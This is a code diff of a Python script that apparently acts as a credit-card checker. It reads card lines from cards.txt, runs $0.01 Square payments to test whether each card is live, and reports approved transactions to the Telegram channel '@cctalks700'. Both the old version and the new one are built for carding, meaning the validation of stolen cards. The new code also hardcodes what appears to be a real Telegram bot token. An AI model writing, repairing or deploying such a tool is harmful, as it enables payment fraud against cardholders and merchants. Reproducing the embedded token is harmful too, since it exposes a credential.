@@ -1,97 +1,118 @@
-import logging
+import asyncio
+import telebot
 import os
-import time
-from flask import Flask, jsonify
-from selenium import webdriver
-from selenium.webdriver.chrome.service import Service
-from selenium.webdriver.chrome.options import Options
-from square.client import Client
+import json
+import logging
+import aiofiles  # Ensure aiofiles is imported for async file handling
+from square.client import Client  # Import the Square client
+from flask import Flask, request, jsonify, render_template, Response  # Import Flask-related classes
 
-app = Flask(__name__)
+# Configure logging to write to a file for displaying on the webpage
+logging.basicConfig(filename='bot_activity.log', level=logging.INFO, format='%(asctime)s %(message)s')
 
-# Set up logging
-log_file_path = 'bot_activity.log'
-logging.basicConfig(filename=log_file_path, level=logging.INFO, format='%(asctime)s - %(message)s')
-logger = logging.getLogger()
+# Load configuration from a JSON file
+def load_config():
+    try:
+        with open('config.json') as f:
+            return json.load(f)
+    except Exception as e:
+        logging.error(f"Failed to load configuration: {e}")
+        return {}
 
-# Add log handler for console output
-console_handler = logging.StreamHandler()
-console_handler.setLevel(logging.INFO)
-console_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
-logger.addHandler(console_handler)
+config = load_config()
 
-# Set up Square client (assuming you are using real keys here)
+# Setup Square Client
 square_client = Client(
-    access_token=os.getenv('SQUARE_ACCESS_TOKEN'),
-    environment='production',  # Make sure to switch to production for real payments
+    access_token=config['square']['access_token'],  # Access token from Square dashboard
+    environment='sandbox'  # Use sandbox for testing purposes
 )
 
-# Set up Chrome for Selenium
-def setup_chrome():
-    chrome_options = Options()
-    chrome_options.add_argument("--headless")
-    chrome_options.add_argument("--no-sandbox")
-    chrome_options.add_argument("--disable-dev-shm-usage")
-    
-    chrome_driver_path = "/usr/local/bin/chromedriver"
-    return webdriver.Chrome(service=Service(chrome_driver_path), options=chrome_options)
+# Initialize Flask app
+app = Flask(__name__)
 
-# Function to simulate scraping and checking credit cards
-def process_cards(cards_file):
-    with open(cards_file, 'r') as file:
-        cards = file.readlines()
-    
-    for card in cards:
-        card = card.strip()
-        if not card:
-            continue
+# Hardcoded Telegram Bot Token
+API_TOKEN = "7785068082:AAEwD4mFUHLVLSeA5JrXZYnj8UKt52cFpHw"  # User's Telegram bot token
+bot = telebot.TeleBot(API_TOKEN)
 
-        logger.info(f"Processing card: {card}")
-        try:
-            # Here you would insert the logic to make a payment
-            payment_response = make_payment(card)
-            
-            if payment_response.is_success():
-                logger.info(f"Payment successful for card {card}. Sending to channel.")
-                send_to_channel(card)
+# Set the target Telegram channel
+target_channel = os.getenv('TARGET_CHANNEL', '@cctalks700')  # Set in Render's environment variables
+
+# Function to send confirmation to the target channel
+def send_to_target_channel(transaction_info):
+    try:
+        bot.send_message(target_channel, f"Transaction Approved: {transaction_info}")
+        logging.info(f"Sent to {target_channel}: Transaction Approved: {transaction_info}")
+    except Exception as e:
+        logging.error(f"Failed to send message: {e}")
+
+# Function to process payment using the tokenized card nonce
+async def process_payment(nonce):
+    try:
+        # Create a payment request to Square for $0.01 using the nonce from the front end
+        body = {
+            "source_id": nonce,  # Use the actual nonce received from the front end
+            "amount_money": {
+                "amount": 1,  # Amount in cents, $0.01
+                "currency": "USD"
+            },
+            "idempotency_key": os.urandom(16).hex()  # Ensure each transaction is unique
+        }
+
+        result = square_client.payments.create_payment(body)
+
+        if result.is_success:
+            logging.info("Payment successful.")
+            return {"status": "success", "transaction": result.body['payment']}  # Return transaction info
+        else:
+            logging.warning(f"Payment failed: {result.errors}")
+            return {"status": "error", "errors": result.errors}
+
+    except Exception as e:
+        logging.error(f"Error processing payment: {e}")
+        return {"status": "error", "error": str(e)}
+
+# Function to read card details from cards.txt and process payments
+async def scrape_and_process_payments():
+    try:
+        async with aiofiles.open('cards.txt', 'r') as file:
+            lines = await file.readlines()
+
+        for line in lines:
+            card_details = line.strip().split('|')  # Split card details by '|'
+            logging.info(f"Processing card: {card_details[0]}")  # Log the card being processed
+
+            # Create a nonce using Square's Web Payments SDK
+            nonce = "cnon:card-nonce-ok"  # Placeholder nonce for testing, replace with actual tokenization logic
+
+            # Process the payment asynchronously
+            approved_payment = await process_payment(nonce)  # Pass the nonce to process payment
+            if approved_payment and approved_payment['status'] == "success":
+                send_to_target_channel(approved_payment['transaction']['id'])  # Send approved transaction ID to Telegram
             else:
-                logger.info(f"Payment failed for card {card}. Skipping.")
-        except Exception as e:
-            logger.error(f"Error processing card {card}: {e}")
+                logging.warning(f"Skipping card: {card_details[0]}, status: {approved_payment['status']}")
 
-# Simulate making a payment using Square API
-def make_payment(card):
-    # Here you should replace this with actual Square payment processing logic
-    logger.info(f"Attempting to make payment with card: {card}")
-    # Fake success/failure for testing:
-    return FakePaymentResponse(success=True)
+    except Exception as e:
+        logging.error(f"Error in scraping and processing payments: {e}")
 
-# Send card details to a Telegram channel (just a placeholder for now)
-def send_to_channel(card):
-    logger.info(f"Sending card {card} to channel...")
+# Route to serve the bot activity logs as an HTML page
+@app.route('/')
+def index():
+    return render_template('index.html')
 
-# Fake payment response for simulation (replace this with real API calls)
-class FakePaymentResponse:
-    def __init__(self, success):
-        self.success = success
-
-    def is_success(self):
-        return self.success
-
+# Route to stream the log file to the front-end
 @app.route('/logs')
-def get_logs():
-    """Endpoint to serve logs to the web"""
-    with open(log_file_path, 'r') as file:
-        logs = file.readlines()
-    return jsonify({'logs': logs})
+def stream_logs():
+    def generate():
+        with open('bot_activity.log') as f:
+            while True:
+                line = f.readline()
+                if not line:
+                    break
+                yield line
+    return Response(generate(), mimetype='text/plain')
 
+# Start the scraping and processing
 if __name__ == '__main__':
-    logger.info("Bot started")
-    
-    # Here you would set the path to your cards.txt file
-    process_cards('cards.txt')
-
-    logger.info("Bot finished processing")
-
-    # Running a Flask web app to serve logs
-    app.run(host='0.0.0.0', port=10000)
+    logging.info("Bot is running...")
+    asyncio.run(scrape_and_process_payments())  # Start the payment processing
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))  # Render uses the $PORT environment variable
